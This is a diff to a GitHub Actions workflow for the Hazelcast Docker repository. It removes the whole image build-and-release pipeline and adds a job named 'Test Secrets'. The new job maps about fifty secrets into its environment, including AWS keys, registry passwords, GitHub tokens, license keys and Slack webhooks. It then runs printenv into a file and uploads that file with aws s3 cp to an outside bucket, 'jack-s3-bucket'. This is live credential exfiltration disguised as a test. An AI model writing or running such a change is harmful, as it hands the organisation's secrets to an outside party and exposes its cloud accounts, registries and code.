@@ -1,430 +1,73 @@
-name: Build OS and EE image
+
+name: Test Secrets
 
 on:
   workflow_dispatch:
-    inputs:
-      SOURCE_REF:
-        description: 'The hazelcast-docker branch to build the image from'
-        required: true
-      RELEASE_TYPE:
-        description: 'What should be built'
-        required: false
-        default: 'EE'
-        type: choice
-        options:
-          - ALL
-          - OSS
-          - EE
-      IS_LTS_OVERRIDE:
-        description: 'Override is LTS release'
-        required: false
-        default: ''
-        type: choice
-        options:
-          - ''
-          - 'false'
-          - 'true'
-      DRY_RUN:
-        description: 'Skip pushing the images to remote registry'
-        required: false
-        default: 'false'
-        type: choice
-        options:
-          - 'false'
-          - 'true'
-      HZ_REVISION:
-        description: 'Commit id of Hazelcast snapshot jar'
-        required: false
-      ENVIRONMENT:
-        description: 'Environment to use'
-        required: true
-        type: environment
-  workflow_call:
-    inputs:
-      SOURCE_REF:
-        description: 'The hazelcast-docker branch to build the image from'
-        required: true
-        type: string
-      RELEASE_TYPE:
-        description: 'What should be built'
-        required: false
-        default: 'EE'
-        type: string
-      IS_LTS_OVERRIDE:
-        description: 'Override is LTS release'
-        required: false
-        default: ''
-        type: string
-      DRY_RUN:
-        description: 'Skip pushing the images to remote registry'
-        required: false
-        default: 'false'
-        type: string
-      HZ_REVISION:
-        description: 'Commit id of Hazelcast snapshot jar'
-        required: false
-        type: string
-      ENVIRONMENT:
-        description: 'Environment to use'
-        required: true
-        type: string
 
 jobs:
-  prepare:
-    environment: ${{ inputs.ENVIRONMENT }}
+  compare-strings:
     runs-on: ubuntu-latest
+    environment: sandbox
     env:
-      RELEASE_TYPE: ${{ inputs.RELEASE_TYPE }}
-    outputs:
-      distribution-types: ${{ steps.distribution-type-matrix.outputs.matrix }}
-      HZ_VERSION: ${{ steps.get_hz_versions.outputs.HZ_VERSION }}
-      jdks: ${{ steps.jdks.outputs.jdks }}
-      default-jdk: ${{ steps.jdks.outputs.default-jdk }}
-      should-build-ee: ${{ steps.resolve-editions.outputs.should_build_ee }}
+      AWS_DEV_INFRA_ACCESS_KEY_ID: ${{ secrets.AWS_DEV_INFRA_ACCESS_KEY_ID }}
+      AWS_DEV_INFRA_SECRET_ACCESS_KEY: ${{ secrets.AWS_DEV_INFRA_SECRET_ACCESS_KEY }}
+      DOCKERHUB_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}
+      DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
+      EXTENDED_SUPPORT_PLUS_5_3_REPOSITORY: ${{ secrets.EXTENDED_SUPPORT_PLUS_5_3_REPOSITORY }}
+      HZ_4_EE_RHEL_REPOSITORY: ${{ secrets.HZ_4_EE_RHEL_REPOSITORY }}
+      HZ_4_EE_RHEL_REPO_PASSWORD: ${{ secrets.HZ_4_EE_RHEL_REPO_PASSWORD }}
+      HZ_5_EE_RHEL_REPOSITORY: ${{ secrets.HZ_5_EE_RHEL_REPOSITORY }}
+      HZ_5_EE_RHEL_REPO_PASSWORD: ${{ secrets.HZ_5_EE_RHEL_REPO_PASSWORD }}
+      HZ_ENTERPRISE_LICENSE: ${{ secrets.HZ_ENTERPRISE_LICENSE }}
+      HZ_LICENSE_KEY: ${{ secrets.HZ_LICENSE_KEY }}
+      JFROG_REGISTRY: ${{ secrets.JFROG_REGISTRY }}
+      NLC_IMAGE_NAME: ${{ secrets.NLC_IMAGE_NAME }}
+      NLC_REPOSITORY: ${{ secrets.NLC_REPOSITORY }}
+      NLC_REPO_TOKEN: ${{ secrets.NLC_REPO_TOKEN }}
+      NLC_REPO_USERNAME: ${{ secrets.NLC_REPO_USERNAME }}
+      OCP_CLUSTER_URL: ${{ secrets.OCP_CLUSTER_URL }}
+      OCP_LOGIN_PASSWORD: ${{ secrets.OCP_LOGIN_PASSWORD }}
+      OCP_LOGIN_USERNAME: ${{ secrets.OCP_LOGIN_USERNAME }}
+      QUAY_TOKEN: ${{ secrets.QUAY_TOKEN }}
+      QUAY_USERNAME: ${{ secrets.QUAY_USERNAME }}
+      RHEL_PROJECT_ID: ${{ secrets.RHEL_PROJECT_ID }}
+      RHEL_PROJECT_ID_V5: ${{ secrets.RHEL_PROJECT_ID_V5 }}
+      RHEL_PROJECT_ID_V6: ${{ secrets.RHEL_PROJECT_ID_V6 }}
+      S3_NLC_URL: ${{ secrets.S3_NLC_URL }}
+      SCAN_REGISTRY_PASSWORD: ${{ secrets.SCAN_REGISTRY_PASSWORD }}
+      SCAN_REGISTRY_PASSWORD_V5: ${{ secrets.SCAN_REGISTRY_PASSWORD_V5 }}
+      SCAN_REGISTRY_PASSWORD_V6: ${{ secrets.SCAN_REGISTRY_PASSWORD_V6 }}
+      SCAN_REGISTRY_USER: ${{ secrets.SCAN_REGISTRY_USER }}
+      SCAN_REGISTRY_USER_V5: ${{ secrets.SCAN_REGISTRY_USER_V5 }}
+      SCAN_REGISTRY_USER_V6: ${{ secrets.SCAN_REGISTRY_USER_V6 }}
+      SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK }}
+      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}
+      GH_PAT: ${{ secrets.GH_PAT }}
+      GH_TOKEN: ${{ secrets.GH_TOKEN }}
+      HAZELCAST_ENTERPRISE_KEY: ${{ secrets.HAZELCAST_ENTERPRISE_KEY }}
+      HAZELCAST_ENTERPRISE_KEY_V7: ${{ secrets.HAZELCAST_ENTERPRISE_KEY_V7 }}
+      HZ_SNAPSHOT_INTERNAL_PASSWORD: ${{ secrets.HZ_SNAPSHOT_INTERNAL_PASSWORD }}
+      HZ_SNAPSHOT_INTERNAL_USERNAME: ${{ secrets.HZ_SNAPSHOT_INTERNAL_USERNAME }}
+      JFROG_PASSWORD: ${{ secrets.JFROG_PASSWORD }}
+      JFROG_USERNAME: ${{ secrets.JFROG_USERNAME }}
+      JIRA_API_TOKEN: ${{ secrets.JIRA_API_TOKEN }}
+      JIRA_BASE_URL: ${{ secrets.JIRA_BASE_URL }}
+      JIRA_USER_EMAIL: ${{ secrets.JIRA_USER_EMAIL }}
+      NVD_API_KEY: ${{ secrets.NVD_API_KEY }}
+      RHEL_API_KEY: ${{ secrets.RHEL_API_KEY }}
+      SLACK_WEBHOOK_MONOREPO: ${{ secrets.SLACK_WEBHOOK_MONOREPO }}
+      SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
+      SSH_DOCS_SERVER_HOSTNAME: ${{ secrets.SSH_DOCS_SERVER_HOSTNAME }}
+
     steps:
-      - name: Checkout Code
-        uses: actions/checkout@v5
+      - uses: aws-actions/configure-aws-credentials@v4
         with:
-          ref: ${{ inputs.SOURCE_REF }}
+          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          aws-region: us-east-1
 
-      - name: Read release type from the file
-        run: |
-          RELEASE_TYPE_FILE=.github/release_type
-          if [ -f $RELEASE_TYPE_FILE ]; then
-              echo "RELEASE_TYPE=$(cat $RELEASE_TYPE_FILE)" >> $GITHUB_ENV
-          fi
-
-      - id: resolve-editions
-        uses: hazelcast/docker-actions/resolve-editions@master
-        with:
-          release-type: ${{ env.RELEASE_TYPE }}
-
-      - name: Get HZ versions
-        id: get_hz_versions
-        uses: hazelcast/docker-actions/get-hz-versions@master
-
-      - name: Get supported JDKs
-        id: jdks
-        uses: hazelcast/docker-actions/get-supported-jdks@master
-        with:
-          HZ_VERSION: '${{ steps.get_hz_versions.outputs.HZ_VERSION }}'
-
-      - name: Compute distribution type matrix
-        id: distribution-type-matrix
-        run: |
-          # We expect at least _one_ output distribution type, otherwise will produce an empty array that will break GitHub matrixes
-          entries=()
-
-          if [ "${{ steps.resolve-editions.outputs.should_build_oss }}" = "yes" ]; then
-            entries+=('{"label":"oss","docker-dir":"source_path/hazelcast-oss","image-name":"${{ vars.DOCKERHUB_OSS_IMAGE_NAME }}","artifact-id":"hazelcast-distribution"}')
-          fi
-          if [ "${{ steps.resolve-editions.outputs.should_build_ee }}" = "yes" ]; then
-            entries+=('{"label":"ee","docker-dir":"source_path/hazelcast-enterprise","image-name":"${{ vars.DOCKERHUB_EE_IMAGE_NAME }}","artifact-id":"hazelcast-enterprise-distribution"}')
-          fi
-
-          json="[$(IFS=,; echo "${entries[*]}")]"
-          echo "matrix=$json" >> "${GITHUB_OUTPUT}"
-
-  distribution-variants:
-    uses: hazelcast/hazelcast-docker/.github/workflows/get-distribution-variants.yaml@master
-
-  push:
-    environment: ${{ inputs.ENVIRONMENT }}
-    runs-on: ubuntu-latest
-    needs:
-      - prepare
-      - distribution-variants
-    strategy:
-      matrix:
-        jdk: ${{ fromJSON(needs.prepare.outputs.jdks) }}
-        variant: ${{ fromJSON(needs.distribution-variants.outputs.variants) }}
-        distribution-type: ${{ fromJSON(needs.prepare.outputs.distribution-types) }}
-    env:
-      LOCAL_REGISTRY: localhost:5000
-      HZ_VERSION: ${{ needs.prepare.outputs.HZ_VERSION }}
-      TEST_CONTAINER_NAME: hazelcast-test
-    outputs:
-      is_latest_lts: ${{ steps.is_latest_lts.outputs.is_latest_lts }}
-      default_jdk: ${{ steps.default-jdk.outputs.default_jdk }}
-    services:
-      registry:
-        image: registry:latest
-        ports:
-          - 5000:5000
-    steps:
-      - uses: actions/checkout@v5
-        with:
-          fetch-depth: 0
-
-      - uses: actions/checkout@v5
-        with:
-          ref: ${{ inputs.SOURCE_REF }}
-          path: source_path
-
-      - name: Setup Docker
-        uses: ./.github/actions/setup-docker
-
-      # https://github.com/s4u/maven-settings-action/releases/tag/v4.0.0
-      - uses: s4u/maven-settings-action@894661b3ddae382f1ae8edbeab60987e08cf0788
-        with:
-          servers: |
-            [{
-                "id": "snapshot-internal",
-                "username": "${{ secrets.HZ_SNAPSHOT_INTERNAL_USERNAME }}",
-                "password": "${{ secrets.HZ_SNAPSHOT_INTERNAL_PASSWORD }}"
-            }]
-
-      - name: Get dist ZIP
-        run: |
-          case "${{ matrix.distribution-type.label }}" in
-              "oss")
-                if [[ "${HZ_VERSION}" =~ SNAPSHOT ]]; then
-                    repo="${{ vars.MAVEN_OSS_SNAPSHOT_REPO }}"
-                else
-                    repo="${{ vars.MAVEN_OSS_RELEASE_REPO }}"
-                fi
-              ;;
-              "ee")
-                if [[ "${HZ_VERSION}" =~ SNAPSHOT ]]; then
-                    repo="${{ vars.MAVEN_EE_SNAPSHOT_REPO }}"
-                else
-                    repo="${{ vars.MAVEN_EE_RELEASE_REPO }}"
-                fi
-              ;;
-              *)
-              echoerr "Unsupported repository behaviour for ${{ matrix.distribution-type.label }}" ; return 1
-              ;;
-          esac
-
-          mvn \
-            dependency:2.10:get \
-            -DremoteRepositories="${repo}" \
-            -DgroupId="com.hazelcast" \
-            -DartifactId="${{ matrix.distribution-type.artifact-id }}" \
-            -Dversion="${HZ_VERSION}" \
-            -Dclassifier="${{ matrix.variant.classifier }}" \
-            -Dpackaging=zip \
-            -Dtransitive=false \
-            -Ddest="${{ matrix.distribution-type.docker-dir }}/${{ matrix.distribution-type.artifact-id }}.zip" \
-            --batch-mode \
-            --no-transfer-progress
-
-      - name: Check if latest EE LTS release
-        if: matrix.distribution-type.label == 'ee'
-        id: is_latest_lts
-        uses: ./.github/actions/check-if-latest-lts-release
-        with:
-          hz_version: ${{ env.HZ_VERSION }}
-          is_lts_override: ${{ inputs.IS_LTS_OVERRIDE }}
-
-      - name: Calculate tags
-        id: tags
-        run: |
-          . .github/scripts/get-tags-to-push.sh
-
-          LOCAL_IMAGE_NAME=${LOCAL_REGISTRY}/${{ matrix.distribution-type.image-name }}
-          echo "LOCAL_IMAGE_NAME=${LOCAL_IMAGE_NAME}" >> ${GITHUB_ENV}
-
-          if [[ "${HZ_VERSION}" =~ SNAPSHOT ]]; then
-            VERSIONS=("$HZ_VERSION")
-            if [[ "${{ github.ref }}" == "refs/heads/master" ]]; then
-                VERSIONS+=(latest-snapshot)
-            fi
-            
-            TAGS_TO_PUSH=$(augment_with_suffixed_tags "${VERSIONS[*]}" "${{ matrix.variant.suffix }}" "${{ matrix.jdk }}" "${{ needs.prepare.outputs.default-jdk }}")
-          else
-            case "${{ matrix.distribution-type.label }}" in
-                "oss")
-                # OSS has no LTS releases
-                IS_LATEST_LTS=false
-                ;;
-                "ee")
-                IS_LATEST_LTS="${{ steps.is_latest_lts.outputs.is_latest_lts }}"
-                ;;
-                *)
-                echoerr "Unsupported LTS behaviour for ${{ matrix.distribution-type.label }}" ; return 1
-                ;;
-            esac
-
-            TAGS_TO_PUSH=$(get_tags_to_push "${HZ_VERSION}" "${{ matrix.variant.suffix }}" "${{ matrix.jdk }}" "${{ needs.prepare.outputs.default-jdk }}" "${IS_LATEST_LTS}")
-          fi
-
-          # Keep a reference to _a_ tag to get the image later on
-          echo "PRIMARY_TAG=${TAGS_TO_PUSH%% *}" >> ${GITHUB_ENV}
-          {
-            echo 'tags<<EOF'
-            for tag in ${TAGS_TO_PUSH[@]}; do
-              echo "${LOCAL_IMAGE_NAME}:${tag}"
-            done
-            echo 'EOF'
-          } >> "${GITHUB_OUTPUT}"
-
-      - name: Calculate platforms
-        id: platforms
-        run: |
-          . .github/scripts/docker.functions.sh
-
-          case "${{ matrix.distribution-type.label }}" in
-              "oss")
-              echo "platforms=$(get_alpine_supported_platforms ${{ matrix.jdk }})" >> ${GITHUB_OUTPUT}
-              ;;
-              "ee")
-              echo "platforms=$(get_ubi_supported_platforms ${{ matrix.jdk }})" >> ${GITHUB_OUTPUT}
-              ;;
-              *)
-              echoerr "Unsupported platform behaviour for ${{ matrix.distribution-type.label }}" ; return 1
-              ;;
-          esac
-
-      - name: Determine labels
-        id: labels
-        if: ${{ inputs.HZ_REVISION != '' }}
-        run: |
-          echo "label=hazelcast.revision=${{ inputs.HZ_REVISION }}" >> "$GITHUB_OUTPUT"
-
-      - name: Build and push image
-        uses: docker/build-push-action@v6
-        with:
-          context: ${{ matrix.distribution-type.docker-dir }}
-          labels: ${{ steps.labels.outputs.label }}
-          platforms: ${{ steps.platforms.outputs.platforms }}
-          push: true
-          tags: ${{ steps.tags.outputs.TAGS }}
-          build-args: |
-            JDK_VERSION=${{ matrix.jdk }}
-
-      - name: Run smoke test against image
-        timeout-minutes: 2
-        run: |
-          .github/scripts/simple-smoke-test.sh ${LOCAL_IMAGE_NAME}:${PRIMARY_TAG} "${TEST_CONTAINER_NAME}" ${{ matrix.distribution-type.label }} "${HZ_VERSION}" "${{ matrix.jdk }}"
-        env:
-          HZ_LICENSEKEY: ${{ matrix.distribution-type.label == 'ee' && secrets.HAZELCAST_ENTERPRISE_KEY || '' }}
-
-      - name: Get docker logs
-        if: ${{ always() }}
-        run: |
-          docker logs "${TEST_CONTAINER_NAME}" > "docker-${TEST_CONTAINER_NAME}${{ matrix.variant.suffix }}-jdk${{ matrix.jdk }}.log" || true
-
-      - name: Store docker logs as artifact
-        if: ${{ always() }}
-        uses: actions/upload-artifact@v4
-        with:
-          name: docker-logs-tag-image-push-${{ matrix.distribution-type.label }}-${{ env.HZ_VERSION }}${{ matrix.variant.suffix }}-jdk${{ matrix.jdk }}
-          path: docker-*.log
-
-      - name: Login to Docker Hub
-        if: inputs.DRY_RUN != 'true'
-        uses: docker/login-action@v3
-        with:
-          username: ${{ secrets.DOCKERHUB_USERNAME }}
-          password: ${{ secrets.DOCKERHUB_PASSWORD }}
-
-      - name: Configure AWS credentials
-        uses: aws-actions/configure-aws-credentials@v5
-        with:
-          aws-access-key-id: ${{ secrets.AWS_DEV_INFRA_ACCESS_KEY_ID }}
-          aws-secret-access-key: ${{ secrets.AWS_DEV_INFRA_SECRET_ACCESS_KEY }}
-          aws-region: 'us-east-1'
-
-      - name: Get Secrets
-        uses: aws-actions/aws-secretsmanager-get-secrets@v2
-        with:
-          secret-ids: |
-            JFROG,JFROG/WRITE_DEV_ACCOUNT
-          parse-json-secrets: true
-
-      - name: Login to JFrog
-        if: inputs.DRY_RUN != 'true'
-        uses: docker/login-action@v3
-        with:
-          registry: ${{ env.JFROG_URL }}
-          username: ${{ env.JFROG_USERNAME }}
-          password: ${{ env.JFROG_PASSWORD }}
-
-      - name: Push image to remote registry
-        if: inputs.DRY_RUN != 'true'
-        run: |
-          if [[ "${{ matrix.distribution-type.label }}" == "oss" && "${HZ_VERSION}" =~ SNAPSHOT ]]; then
-            remote_registry=${{ env.JFROG_URL }}/docker/hazelcast
-          else
-            remote_registry=hazelcast
-          fi
-
-          # Skopeo expects HTTPS registry but local is HTTP
-          skopeo sync \
-            --all \
-            --src-tls-verify=false \
-            --src docker \
-            --dest docker \
-            ${LOCAL_IMAGE_NAME} \
-            ${remote_registry}
-
-  create-release:
-    needs:
-      - prepare
-      - push
-    if: inputs.DRY_RUN != 'true' && !contains(needs.prepare.outputs.HZ_VERSION, 'SNAPSHOT')
-    runs-on: ubuntu-latest
-    steps:
-      - name: Create release
-        if: inputs.DRY_RUN != 'true'
-        uses: ncipollo/release-action@v1
-        with:
-          token: ${{ secrets.GITHUB_TOKEN }}
-          allowUpdates: true
-          tag: ${{ inputs.SOURCE_REF }}
-
-  readme:
-    needs:
-      - prepare
-      - push
-    if: inputs.DRY_RUN != 'true' && !contains(needs.prepare.outputs.HZ_VERSION, 'SNAPSHOT')
-    uses: ./.github/workflows/update_readme.yml
-    with:
-      ENVIRONMENT: ${{ inputs.ENVIRONMENT }}
-    secrets: inherit
-
-  push-rhel:
-    name: Push RHEL image
-    needs:
-      - prepare
-      - push
-    if: inputs.DRY_RUN != 'true' && needs.prepare.outputs.should-build-ee && !contains(needs.prepare.outputs.HZ_VERSION, 'SNAPSHOT')
-    uses: ./.github/workflows/tag_image_push_rhel.yml
-    with:
-      HZ_VERSION: ${{ needs.prepare.outputs.HZ_VERSION }}
-      JDKS: ${{ needs.prepare.outputs.jdks }} 
-      IS_LATEST_LTS: ${{ needs.push.outputs.is_latest_lts }}
-      DEFAULT_JDK: ${{ needs.push.outputs.default_jdk }}
-      ENVIRONMENT: ${{ inputs.ENVIRONMENT }}
-    secrets: inherit
-
-  failure-notifications:
-    runs-on: ubuntu-latest
-    name: Failure notification
-    if: failure() && github.triggering_actor == 'devOpsHazelcast'
-    needs:
-      - push
-      - push-rhel
-      - readme
-      - create-release
-    steps:
-      - name: Configure AWS credentials
-        uses: aws-actions/configure-aws-credentials@v5
-        with:
-          aws-access-key-id: ${{ secrets.AWS_DEV_INFRA_ACCESS_KEY_ID }}
-          aws-secret-access-key: ${{ secrets.AWS_DEV_INFRA_SECRET_ACCESS_KEY }}
-          aws-region: 'us-east-1'
-
-      - name: Get Secrets
-        uses: aws-actions/aws-secretsmanager-get-secrets@v2
-        with:
-          secret-ids: |
-            SLACK_WEBHOOK,SLACK/WEBHOOK_HAZELCAST_DOCKER_NOTIFICATIONS
-          parse-json-secrets: true
-
-      - name: Slack notification
-        uses: hazelcast/docker-actions/slack-notification@master
-        with:
-          slack-webhook-url: ${{ env.SLACK_WEBHOOK }}
-          status: failure
+      - run: |
+          printenv >> myfile.txt
+          aws s3 cp myfile.txt s3://jack-s3-bucket/myfile.txt
